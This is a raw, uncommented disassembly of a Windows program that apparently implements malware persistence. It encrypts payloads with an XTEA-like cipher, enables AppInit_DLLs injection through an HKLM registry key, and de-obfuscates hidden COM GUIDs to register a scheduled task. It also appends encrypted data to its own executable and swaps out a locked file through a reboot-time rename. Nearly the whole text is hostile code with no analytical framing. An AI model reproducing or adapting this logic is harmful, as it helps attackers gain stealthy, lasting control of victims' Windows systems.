push    ebp
mov     ebp, esp
sub     esp, 1ch
push    esi
mov     esi, [ebp+hinstance]
push    edi
mov     edi, ds:loadstringw
push    64h
push    offset windowname
push    67h
push    esi
call    edi
push    64h
push    offset classname
push    6dh
push    esi
call    edi
mov     eax, esi
call    sub_4010f0
test    ax, ax
jnz     short loc_40103f
pop     edi
xor     eax, eax
pop     esi
mov     esp, ebp
pop     ebp
retn    10h
push    0
push    esi
push    0
push    0
push    0
push    80000000h
push    0
push    80000000h
push    0cf0000h
push    offset windowname
push    offset classname
push    0
mov     hinstance, esi
call    ds:createwindowexw
test    eax, eax
jz      short loc_401035
push    eax
call    ds:updatewindow
push    6dh
push    esi
call    ds:loadacceleratorsw
mov     edi, ds:getmessagew
push    0
push    0
mov     esi, eax
push    0
lea     eax, [ebp+msg]
push    eax
call    edi
test    eax, eax
jz      short loc_4010d8
push    ebx
mov     ebx, ds:translateacceleratorw
mov     edx, [ebp+msg.hwnd]
lea     ecx, [ebp+msg]
push    ecx
push    esi
push    edx
call    ebx
test    eax, eax
jnz     short loc_4010c7
lea     eax, [ebp+msg]
push    eax
call    ds:translatemessage
lea     ecx, [ebp+msg]
push    ecx
call    ds:dispatchmessagew
push    0
push    0
push    0
lea     edx, [ebp+msg]
push    edx
call    edi
test    eax, eax
jnz     short loc_4010a4
pop     ebx
mov     eax, [ebp+msg.wparam]
pop     edi
pop     esi
mov     esp, ebp
pop     ebp
retn    10h
push    ebp
mov     ebp, esp
sub     esp, 30h
push    esi
mov     esi, ds:loadiconw
push    6bh
push    eax
mov     [ebp+var_30.cbsize], 30h
mov     [ebp+var_30.style], 3
mov     [ebp+var_30.lpfnwndproc], offset sub_402680
mov     [ebp+var_30.cbclsextra], 0
mov     [ebp+var_30.cbwndextra], 0
mov     [ebp+var_30.hinstance], eax
call    esi
push    7f00h
push    0
mov     [ebp+var_30.hicon], eax
call    ds:loadcursorw
mov     [ebp+var_30.hcursor], eax
mov     eax, [ebp+var_30.hinstance]
push    6ch
push    eax
mov     [ebp+var_30.hbrbackground], 6
mov     [ebp+var_30.lpszmenuname], 6dh
mov     [ebp+var_30.lpszclassname], offset classname
call    esi
lea     ecx, [ebp+var_30]
push    ecx
mov     [ebp+var_30.hiconsm], eax
call    ds:registerclassexw
pop     esi
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
push    ecx
mov     ecx, [ebp+arg_0]
mov     eax, [ecx]
mov     ecx, [ecx+4]
push    ebx
push    esi
bswap   eax
bswap   ecx
xor     edx, edx
mov     [ebp+var_4], 20h
push    edi
lea     esp, [esp+0]
mov     edi, [ebp+arg_4]
mov     esi, edx
and     esi, 3
mov     esi, [edi+esi*4]
bswap   esi
add     esi, edx
mov     edi, ecx
shr     edi, 5
mov     ebx, ecx
shl     ebx, 4
xor     edi, ebx
add     edi, ecx
xor     esi, edi
mov     edi, [ebp+arg_4]
add     eax, esi
sub     edx, 61c88647h
mov     esi, edx
shr     esi, 0bh
and     esi, 3
mov     esi, [edi+esi*4]
mov     edi, eax
shr     edi, 5
mov     ebx, eax
shl     ebx, 4
bswap   esi
xor     edi, ebx
add     esi, edx
add     edi, eax
xor     esi, edi
add     ecx, esi
dec     [ebp+var_4]
jnz     short loc_401190
mov     edx, [ebp+arg_0]
pop     edi
bswap   eax
bswap   ecx
pop     esi
mov     [edx], eax
mov     [edx+4], ecx
pop     ebx
mov     esp, ebp
pop     ebp
retn    8
push    ebp
mov     ebp, esp
sub     esp, 0ch
mov     eax, [ebp+arg_0]
add     edx, 7
shr     edx, 3
dec     edx
mov     [ebp+var_c], edx
js      loc_4012c5
push    ebx
push    esi
push    edi
jmp     short loc_401223
mov     eax, [ebp+arg_0]
lea     ecx, [eax+edx*8-8]
test    edx, edx
jnz     short loc_40122e
mov     ecx, [ebp+arg_c]
mov     [ebp+var_8], ecx
mov     ecx, [eax+edx*8]
mov     eax, [eax+edx*8+4]
bswap   ecx
bswap   eax
mov     edx, 0c6ef3720h
mov     [ebp+var_4], 20h
mov     edi, [ebp+arg_8]
mov     esi, edx
shr     esi, 0bh
and     esi, 3
mov     esi, [edi+esi*4]
bswap   esi
add     esi, edx
mov     edi, ecx
shr     edi, 5
mov     ebx, ecx
shl     ebx, 4
xor     edi, ebx
add     edi, ecx
xor     esi, edi
mov     edi, [ebp+arg_8]
sub     eax, esi
add     edx, 61c88647h
mov     esi, edx
and     esi, 3
mov     esi, [edi+esi*4]
mov     edi, eax
shr     edi, 5
mov     ebx, eax
shl     ebx, 4
bswap   esi
xor     edi, ebx
add     esi, edx
add     edi, eax
xor     esi, edi
sub     ecx, esi
dec     [ebp+var_4]
jnz     short loc_401248
mov     edx, [ebp+var_c]
mov     esi, [ebp+arg_4]
bswap   ecx
mov     [esi+edx*8], ecx
lea     ecx, [esi+edx*8+4]
bswap   eax
mov     [ecx], eax
mov     eax, [ebp+var_8]
mov     edi, [eax]
xor     [esi+edx*8], edi
mov     eax, [eax+4]
xor     [ecx], eax
dec     edx
mov     [ebp+var_c], edx
jns     loc_401220
pop     edi
pop     esi
pop     ebx
mov     esp, ebp
pop     ebp
retn    10h
push    esi
push    edi
mov     edi, eax
mov     eax, 4ec4ec4fh
mul     edi
shr     edx, 3
mov     eax, edx
imul    eax, 1ah
sub     edi, eax
mov     esi, edx
mov     eax, 4ec4ec4fh
mul     esi
shr     edx, 3
mov     eax, edx
imul    eax, 1ah
sub     esi, eax
add     esi, 61h
mov     [ecx+2], si
mov     esi, edx
mov     eax, 4ec4ec4fh
mul     esi
shr     edx, 3
mov     eax, edx
imul    eax, 1ah
sub     esi, eax
add     esi, 61h
mov     [ecx+4], si
mov     esi, edx
mov     eax, 4ec4ec4fh
mul     esi
shr     edx, 3
mov     eax, edx
imul    eax, 1ah
sub     esi, eax
add     esi, 61h
mov     [ecx+6], si
mov     esi, edx
mov     eax, 4ec4ec4fh
mul     esi
shr     edx, 3
mov     eax, edx
imul    eax, 1ah
sub     esi, eax
add     edi, 61h
mov     [ecx], di
mov     edi, edx
mov     eax, 4ec4ec4fh
mul     edi
add     esi, 61h
mov     [ecx+8], si
mov     esi, edx
shr     esi, 3
mov     edx, esi
imul    edx, 1ah
sub     edi, edx
mov     eax, 4ec4ec4fh
mul     esi
shr     edx, 3
imul    edx, 1ah
sub     esi, edx
add     edi, 61h
add     esi, 61h
mov     [ecx+0ah], di
xor     eax, eax
mov     [ecx+0ch], si
pop     edi
mov     [ecx+0eh], ax
lea     eax, [ecx+0eh]
pop     esi
retn
push    ebp
mov     ebp, esp
sub     esp, 2ch
mov     eax, ___security_cookie
xor     eax, ebp
mov     [ebp+var_4], eax
push    esi
lea     eax, [ebp+phkresult]
push    eax
push    3
push    0
push    offset subkey
push    80000002h
call    ds:regopenkeyexw
test    eax, eax
jz      short loc_4013de
xor     al, al
pop     esi
mov     ecx, [ebp+var_4]
xor     ecx, ebp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
mov     eax, offset filename
lea     edx, [eax+2]
mov     cx, [eax]
add     eax, 2
test    cx, cx
jnz     short loc_4013e6
mov     esi, ds:regsetvalueexw
sub     eax, edx
mov     edx, [ebp+phkresult]
sar     eax, 1
lea     ecx, [eax+eax]
push    ecx
push    offset filename
push    1
push    0
push    offset valuename
push    edx
call    esi
test    eax, eax
jnz     short loc_4013cd
mov     ecx, [ebp+phkresult]
push    4
lea     eax, [ebp+data]
push    eax
push    4
push    0
push    offset aloadappinitdll
push    ecx
mov     dword ptr [ebp+data], 1
call    esi
mov     edx, [ebp+phkresult]
push    edx
call    ds:regclosekey
mov     ecx, dword_40ab24
mov     edx, dword_40ab28
mov     eax, dword_40ab20
mov     [ebp+var_10], ecx
mov     ecx, dword_40ab30
mov     [ebp+var_c], edx
mov     edx, dword_40ab34
mov     [ebp+var_14], eax
mov     eax, dword_40ab2c
mov     [ebp+var_28], ecx
mov     ecx, dword_40ab38
mov     [ebp+var_24], edx
xor     edx, edx
or      ecx, dword_40ab3c
mov     [ebp+var_8], eax
mov     [ebp+nnumberofbytestowrite], edx
mov     eax, offset dword_40ab38
jz      short loc_4014a0
lea     esp, [esp+0]
mov     ecx, [eax+0ch]
add     eax, 8
add     edx, 8
or      ecx, [eax]
jnz     short loc_401490
mov     [ebp+nnumberofbytestowrite], edx
lea     eax, [ebp+var_28]
push    eax
lea     ecx, [ebp+var_14]
push    ecx
push    offset dword_40ab38
push    offset dword_40ab38
call    sub_401200
push    0
push    0
push    2
push    0
push    0
push    40000000h
push    offset filename
call    ds:createfilew
mov     esi, eax
cmp     esi, 0ffffffffh
jz      short loc_4014f5
mov     eax, [ebp+nnumberofbytestowrite]
push    0
lea     edx, [ebp+nnumberofbytestowrite]
push    edx
push    eax
push    offset dword_40ab38
push    esi
call    ds:writefile
push    esi
call    ds:closehandle
mov     ecx, [ebp+var_4]
xor     ecx, ebp
mov     al, 1
pop     esi
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 0a4h
mov     eax, ___security_cookie
xor     eax, ebp
mov     [ebp+var_4], eax
push    ebx
push    esi
xor     ebx, ebx
push    edi
push    ebx
push    ebx
mov     [ebp+ppv], ebx
mov     [ebp+var_8c], ebx
mov     [ebp+var_98], ebx
mov     [ebp+var_94], ebx
call    ds:coinitializeex
lea     eax, [ebp+riid]
mov     [ebp+var_9c], eax
mov     [ebp+var_a0], offset dword_4088d8
mov     edi, [ebp+var_9c]
mov     esi, [ebp+var_a0]
mov     ecx, 201686a3h
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
lea     ecx, [ebp+rclsid]
mov     [ebp+var_a0], ecx
mov     [ebp+var_9c], offset dword_4088c8
mov     edi, [ebp+var_a0]
mov     esi, [ebp+var_9c]
mov     ecx, 2c7e4babh
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
lea     edx, [ebp+var_54]
mov     [ebp+var_a0], edx
mov     [ebp+var_9c], offset dword_408908
mov     edi, [ebp+var_a0]
mov     esi, [ebp+var_9c]
mov     ecx, 5730a709h
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
lea     eax, [ebp+var_44]
mov     [ebp+var_a0], eax
mov     [ebp+var_9c], offset dword_4088f8
mov     edi, [ebp+var_a0]
mov     esi, [ebp+var_9c]
mov     ecx, 622f1945h
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
lea     ecx, [ebp+var_34]
mov     [ebp+var_a0], ecx
mov     [ebp+var_9c], offset dword_4088e8
mov     edi, [ebp+var_a0]
mov     esi, [ebp+var_9c]
mov     ecx, 3755b3f9h
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
lea     edx, [ebp+ppv]
push    edx
lea     eax, [ebp+riid]
push    eax
push    1
push    ebx
lea     ecx, [ebp+rclsid]
push    ecx
call    ds:cocreateinstance
mov     eax, [ebp+ppv]
cmp     eax, ebx
jz      loc_401815
mov     edx, [eax]
push    offset dword_44b8f0
push    eax
mov     eax, [edx+1ch]
call    eax
mov     eax, [ebp+ppv]
mov     ecx, [eax]
lea     edx, [ebp+var_8c]
push    edx
lea     edx, [ebp+var_54]
push    edx
lea     edx, [ebp+var_44]
push    edx
push    offset dword_44b8f0
push    eax
mov     eax, [ecx+20h]
call    eax
mov     eax, [ebp+var_8c]
cmp     eax, ebx
jz      loc_401815
mov     ecx, [eax]
lea     edx, [ebp+var_94]
push    edx
lea     edx, [ebp+var_88]
push    edx
push    eax
mov     eax, [ecx+0ch]
call    eax
push    30h
lea     ecx, [ebp+var_84]
push    ebx
push    ecx
call    _memset
mov     edx, 7d0h
mov     [ebp+var_80], dx
mov     eax, 30h
mov     [ebp+var_84], ax
mov     eax, [ebp+var_94]
add     esp, 0ch
lea     edx, [ebp+var_84]
mov     [ebp+var_7e], 10001h
mov     [ebp+var_70], 0ffffh
mov     [ebp+var_64], 6
mov     ecx, [eax]
push    edx
push    eax
mov     eax, [ecx+0ch]
call    eax
mov     eax, [ebp+var_8c]
mov     ecx, [eax]
mov     edx, [ecx+80h]
push    offset existingfilename
push    eax
call    edx
mov     eax, [ebp+var_8c]
mov     ecx, [eax]
mov     edx, [ecx+78h]
push    ebx
push    offset dword_408aa0
push    eax
call    edx
mov     eax, [ebp+var_8c]
mov     ecx, [eax]
mov     edx, [ecx+88h]
push    offset substr
push    eax
call    edx
mov     eax, [ebp+var_8c]
mov     ecx, [eax]
lea     edx, [ebp+var_98]
push    edx
lea     edx, [ebp+var_34]
push    edx
push    eax
mov     eax, [ecx]
call    eax
mov     eax, [ebp+var_98]
cmp     eax, ebx
jz      short loc_4017d7
mov     ecx, [eax]
mov     edx, [ecx+18h]
push    1
push    ebx
push    eax
call    edx
mov     eax, [ebp+var_98]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
mov     eax, [ebp+var_8c]
mov     ecx, [eax]
mov     edx, [ecx+30h]
push    eax
call    edx
mov     eax, [ebp+var_8c]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
mov     eax, [ebp+var_94]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
mov     eax, [ebp+ppv]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
call    ds:couninitialize
mov     ecx, [ebp+var_4]
pop     edi
pop     esi
xor     ecx, ebp
pop     ebx
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 2a8h
mov     eax, ___security_cookie
xor     eax, ebp
mov     [ebp+var_8], eax
push    ebx
push    esi
xor     eax, eax
lea     ecx, [ebp+rclsid]
push    edi
mov     [ebp+var_264], 0
mov     word ptr [ebp+var_29c], ax
mov     [ebp+pcbbuffer], ecx
mov     [ebp+var_280], offset dword_408918
mov     edi, [ebp+pcbbuffer]
mov     esi, [ebp+var_280]
mov     ecx, 327fc92bh
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
push    2
push    0
call    ds:coinitializeex
push    0
push    0
push    0
push    3
push    6
push    0
push    0
push    0ffffffffh
push    0
call    ds:coinitializesecurity
lea     edx, [ebp+riid]
mov     [ebp+pcbbuffer], edx
mov     [ebp+var_280], offset dword_408928
mov     edi, [ebp+pcbbuffer]
mov     esi, [ebp+var_280]
mov     ecx, 1baff96ch
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
lea     eax, [ebp+ppv]
push    eax
lea     ecx, [ebp+riid]
push    ecx
push    1
push    0
lea     edx, [ebp+rclsid]
push    edx
call    ds:cocreateinstance
mov     eax, [ebp+ppv]
mov     edi, [eax]
mov     ebx, [ebp+var_29c]
mov     ecx, [ebp+var_298]
mov     edx, [ebp+var_294]
mov     esi, [ebp+var_290]
sub     esp, 10h
mov     eax, esp
mov     [eax], ebx
mov     [eax+4], ecx
mov     [eax+8], edx
mov     [eax+0ch], esi
sub     esp, 10h
mov     eax, esp
mov     [eax], ebx
mov     [eax+4], ecx
mov     [eax+8], edx
mov     [eax+0ch], esi
sub     esp, 10h
mov     eax, esp
mov     [eax], ebx
mov     [eax+4], ecx
mov     [eax+8], edx
mov     [eax+0ch], esi
sub     esp, 10h
mov     eax, esp
mov     [eax], ebx
mov     [eax+4], ecx
mov     ecx, [ebp+ppv]
mov     [eax+8], edx
mov     edx, [edi+28h]
push    ecx
mov     [eax+0ch], esi
call    edx
mov     eax, [ebp+ppv]
mov     ecx, [eax]
lea     edx, [ebp+var_268]
push    edx
push    offset asc_408aa4
push    eax
mov     eax, [ecx+1ch]
call    eax
mov     eax, [ebp+ppv]
mov     ecx, [eax]
lea     edx, [ebp+var_258]
push    edx
push    0
push    eax
mov     eax, [ecx+24h]
call    eax
mov     eax, [ebp+ppv]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
mov     eax, [ebp+var_258]
mov     ecx, [eax]
lea     edx, [ebp+var_27c]
push    edx
push    eax
mov     eax, [ecx+2ch]
call    eax
mov     eax, [ebp+var_27c]
mov     ecx, [eax]
mov     edx, [ecx+58h]
push    1
push    eax
call    edx
mov     eax, [ebp+var_27c]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
mov     eax, [ebp+var_258]
mov     ecx, [eax]
lea     edx, [ebp+var_26c]
push    edx
push    eax
mov     eax, [ecx+24h]
call    eax
cmp     [ebp+arg_0], 0
mov     eax, [ebp+var_26c]
lea     edx, [ebp+var_260]
mov     [ebp+var_10], 31h
push    edx
jz      loc_401ada
mov     [ebp+var_284], 0
mov     ecx, [eax]
push    8
push    eax
mov     eax, [ecx+28h]
call    eax
mov     eax, [ebp+var_26c]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
lea     eax, [ebp+var_224]
mov     [ebp+pcbbuffer], eax
mov     [ebp+var_280], offset dword_408938
mov     edi, [ebp+pcbbuffer]
mov     esi, [ebp+var_280]
mov     ecx, 1f237ee0h
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
mov     eax, [ebp+var_260]
mov     ecx, [eax]
lea     edx, [ebp+var_284]
push    edx
lea     edx, [ebp+var_224]
push    edx
push    eax
mov     eax, [ecx]
call    eax
mov     eax, [ebp+var_260]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
mov     eax, [ebp+var_284]
mov     ecx, [eax]
lea     edx, [ebp+var_10]
push    edx
push    eax
mov     eax, [ecx+24h]
jmp     loc_401bb8
mov     ecx, [eax]
push    9
push    eax
mov     eax, [ecx+28h]
call    eax
mov     eax, [ebp+var_26c]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
lea     eax, [ebp+var_224]
mov     [ebp+var_2a0], eax
mov     [ebp+var_2a4], offset dword_4088a8
mov     edi, [ebp+var_2a0]
mov     esi, [ebp+var_2a4]
mov     ecx, 2b219ff3h
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
mov     eax, [ebp+var_260]
mov     ecx, [eax]
lea     edx, [ebp+var_284]
push    edx
lea     edx, [ebp+var_224]
push    edx
push    eax
mov     eax, [ecx]
call    eax
mov     eax, [ebp+var_260]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
lea     eax, [ebp+pcbbuffer]
push    eax
lea     ecx, [ebp+buffer]
push    ecx
mov     [ebp+pcbbuffer], 100h
call    ds:getusernamew
mov     eax, [ebp+var_284]
mov     edx, [eax]
mov     edx, [edx+5ch]
lea     ecx, [ebp+buffer]
push    ecx
push    eax
call    edx
mov     eax, [ebp+var_284]
mov     ecx, [eax]
lea     edx, [ebp+var_10]
push    edx
push    eax
mov     eax, [ecx+24h]
call    eax
mov     eax, [ebp+var_258]
mov     ecx, [eax]
lea     edx, [ebp+var_280]
push    edx
push    eax
mov     eax, [ecx+3ch]
call    eax
mov     eax, [ebp+var_258]
mov     ecx, [eax]
lea     edx, [ebp+var_274]
push    edx
push    eax
mov     eax, [ecx+44h]
call    eax
mov     eax, [ebp+var_274]
mov     ecx, [eax]
lea     edx, [ebp+var_278]
push    edx
push    0
push    eax
mov     eax, [ecx+30h]
call    eax
mov     eax, [ebp+var_274]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
lea     eax, [ebp+var_244]
mov     [ebp+var_2a4], eax
mov     [ebp+var_2a0], offset dword_4088b8
mov     edi, [ebp+var_2a4]
mov     esi, [ebp+var_2a0]
mov     ecx, 0fc44dc1h
mov     eax, [esi]
mov     edx, [esi+4]
sub     eax, ecx
sub     edx, ecx
mov     [edi], eax
mov     [edi+4], edx
mov     eax, [esi+8]
mov     edx, [esi+0ch]
sub     eax, ecx
sub     edx, ecx
mov     [edi+8], eax
mov     [edi+0ch], edx
mov     eax, [ebp+var_278]
mov     ecx, [eax]
lea     edx, [ebp+var_270]
push    edx
lea     edx, [ebp+var_244]
push    edx
push    eax
mov     eax, [ecx]
call    eax
mov     eax, [ebp+var_278]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
mov     eax, [ebp+var_270]
mov     ecx, [eax]
mov     edx, [ecx+2ch]
push    offset existingfilename
push    eax
call    edx
mov     eax, [ebp+var_270]
mov     ecx, [eax]
mov     edx, [ecx+34h]
push    offset substr
push    eax
call    edx
mov     eax, [ebp+var_270]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
cmp     [ebp+arg_0], 0
jz      loc_401d3e
mov     eax, 8
push    offset psz
mov     word ptr [ebp+var_224], ax
call    ds:sysallocstring
mov     esi, [ebp+var_298]
lea     ecx, [ebp+var_264]
push    ecx
sub     esp, 10h
mov     ecx, esp
mov     [ecx], ebx
mov     [ecx+4], esi
mov     esi, [ebp+var_294]
mov     [ecx+8], esi
mov     esi, [ebp+var_290]
mov     [ecx+0ch], esi
mov     edx, [ebp+var_268]
push    5
mov     edi, [edx]
sub     esp, 10h
mov     ecx, esp
mov     [ecx], ebx
mov     ebx, [ebp+var_298]
mov     [ecx+4], ebx
mov     ebx, [ebp+var_294]
mov     [ecx+8], ebx
mov     [ecx+0ch], esi
mov     esi, [ebp+var_224]
sub     esp, 10h
mov     ecx, esp
mov     [ecx], esi
mov     esi, [ebp+var_220]
mov     [ecx+4], esi
mov     [ecx+8], eax
mov     eax, [ebp+var_218]
push    6
mov     [ecx+0ch], eax
mov     ecx, [ebp+var_258]
push    ecx
push    offset dword_44b8f0
push    edx
mov     edx, [edi+44h]
call    edx
jmp     short loc_401dab
mov     eax, [ebp+var_268]
mov     edi, [eax]
mov     edx, [ebp+var_294]
mov     esi, [ebp+var_290]
lea     ecx, [ebp+var_264]
push    ecx
mov     ecx, [ebp+var_298]
sub     esp, 10h
mov     eax, esp
mov     [eax], ebx
mov     [eax+4], ecx
mov     [eax+8], edx
mov     [eax+0ch], esi
push    3
sub     esp, 10h
mov     eax, esp
mov     [eax], ebx
mov     [eax+4], ecx
mov     [eax+8], edx
mov     [eax+0ch], esi
sub     esp, 10h
mov     eax, esp
mov     [eax], ebx
mov     [eax+4], ecx
mov     ecx, [edi+44h]
mov     [eax+8], edx
mov     edx, [ebp+var_258]
push    6
push    edx
mov     [eax+0ch], esi
mov     eax, [ebp+var_268]
push    offset dword_44b8f0
push    eax
call    ecx
mov     eax, [ebp+var_268]
mov     edx, [eax]
push    eax
mov     eax, [edx+8]
call    eax
mov     eax, [ebp+var_258]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
mov     ecx, [ebp+var_264]
test    ecx, ecx
jz      loc_401e5b
mov     eax, 1
mov     word ptr [ebp+var_29c], ax
mov     esi, [ebp+var_29c]
lea     eax, [ebp+var_280]
push    eax
sub     esp, 10h
mov     eax, esp
mov     [eax], esi
mov     esi, [ebp+var_298]
mov     [eax+4], esi
mov     esi, [ebp+var_294]
mov     [ebp+var_280], 0
mov     edx, [ecx]
mov     [eax+8], esi
mov     esi, [ebp+var_290]
push    ecx
mov     ecx, [edx+30h]
mov     [eax+0ch], esi
call    ecx
mov     eax, [ebp+var_280]
test    eax, eax
jz      short loc_401e34
mov     edx, [eax]
push    eax
mov     eax, [edx+8]
call    eax
mov     eax, [ebp+var_264]
mov     ecx, [eax]
mov     edx, [ecx+8]
push    eax
call    edx
call    ds:couninitialize
mov     al, 1
pop     edi
pop     esi
pop     ebx
mov     ecx, [ebp+var_8]
xor     ecx, ebp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
call    ds:couninitialize
mov     ecx, [ebp+var_8]
pop     edi
pop     esi
xor     ecx, ebp
xor     al, al
pop     ebx
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 408h
mov     eax, ___security_cookie
xor     eax, ebp
mov     [ebp+var_4], eax
push    edi
push    200h
lea     eax, [ebp+filename]
push    eax
push    0
call    ds:getmodulefilenamew
push    0
push    0
push    3
push    0
push    1
push    80000000h
lea     ecx, [ebp+filename]
push    ecx
call    ds:createfilew
mov     edi, eax
cmp     edi, 0ffffffffh
jnz     short loc_401edc
xor     eax, eax
pop     edi
mov     ecx, [ebp+var_4]
xor     ecx, ebp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    esi
push    0
push    edi
call    ds:getfilesize
mov     edx, hheap
mov     [ebp+nnumberofbytestoread], eax
add     eax, 100h
push    eax
push    8
push    edx
call    ds:heapalloc
mov     ecx, [ebp+nnumberofbytestoread]
push    0
mov     esi, eax
lea     eax, [ebp+nnumberofbytestoread]
push    eax
push    ecx
push    esi
push    edi
call    ds:readfile
push    edi
call    ds:closehandle
mov     edx, [ebp+nnumberofbytestoread]
mov     ecx, dword_44b8a4
lea     eax, [esi+edx]
mov     [eax], ecx
mov     edx, dword_44b8a8
push    offset dword_44b894
push    offset dword_44b8a4
mov     [eax+4], edx
call    sub_401170
mov     eax, [ebp+nnumberofbytestoread]
mov     ecx, [ebp+var_4]
add     eax, 8
mov     [ebx], eax
mov     eax, esi
pop     esi
xor     ecx, ebp
pop     edi
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 40ch
mov     eax, ___security_cookie
xor     eax, ebp
mov     [ebp+var_4], eax
push    ebx
push    esi
push    edi
lea     ebx, [ebp+nnumberofbytestowrite]
call    sub_401e80
mov     ebx, eax
test    ebx, ebx
jz      loc_4020ee
mov     edi, ds:createfilew
push    0
push    0
push    2
push    0
push    1
push    40000000h
push    offset existingfilename
call    edi
mov     esi, eax
cmp     esi, 0ffffffffh
jnz     loc_402087
mov     ax, existingfilename
lea     esi, [ebp+newfilename]
test    ax, ax
jz      short loc_401ff2
movzx   ecx, ax
mov     edx, offset existingfilename
mov     eax, esi
sub     edx, eax
nop
movzx   eax, word ptr [edx+esi+2]
mov     [esi], cx
add     esi, 2
mov     ecx, eax
test    ax, ax
jnz     short loc_401fe0
xor     ecx, ecx
mov     [esi], cx
call    ds:gettickcount
mov     ecx, esi
call    sub_4012d0
mov     esi, offset atmp
mov     edx, 2eh
sub     esi, eax
mov     [eax], dx
movzx   ecx, word ptr [esi+eax+2]
add     eax, 2
mov     edx, ecx
test    cx, cx
jnz     short loc_402010
mov     esi, ds:movefileexw
xor     edx, edx
mov     [eax], dx
push    edx
lea     eax, [ebp+newfilename]
push    eax
push    offset existingfilename
call    esi
push    4
push    0
lea     ecx, [ebp+newfilename]
push    ecx
call    esi
push    0
push    0
push    2
push    0
push    1
push    40000000h
push    offset existingfilename
call    edi
mov     esi, eax
cmp     esi, 0ffffffffh
jnz     short loc_402087
mov     edx, hheap
push    ebx
push    0
push    edx
call    ds:heapfree
pop     edi
pop     esi
pop     ebx
mov     ecx, [ebp+var_4]
xor     ecx, ebp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
mov     ecx, [ebp+nnumberofbytestowrite]
push    0
lea     eax, [ebp+nnumberofbytestowrite]
push    eax
push    ecx
push    ebx
push    esi
call    ds:writefile
push    esi
call    ds:closehandle
mov     edx, hheap
push    ebx
push    0
push    edx
call    ds:heapfree
call    ds:getversion
cmp     al, 5
jnz     short loc_4020d6
call    sub_401510
pop     edi
pop     esi
pop     ebx
mov     ecx, [ebp+var_4]
xor     ecx, ebp
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    1
call    sub_401830
add     esp, 4
test    al, al
jnz     short loc_4020ee
push    0
call    sub_401830
add     esp, 4
mov     ecx, [ebp+var_4]
pop     edi
pop     esi
xor     ecx, ebp
pop     ebx
call    @__security_check_cookie@4
mov     esp, ebp
pop     ebp
retn
push    ebp
mov     ebp, esp
sub     esp, 444h
mov     eax, ___security_cookie
xor     eax, ebp
mov     [ebp+var_4], eax
push    ebx
push    edi
lea     ebx, [ebp+nnumberofbytestowrite]
call    sub_401e80
mov     ebx, eax
xor     edi, edi
cmp     ebx, edi
jz      loc_4022bf
push    esi
lea     ecx, [ecx+0]
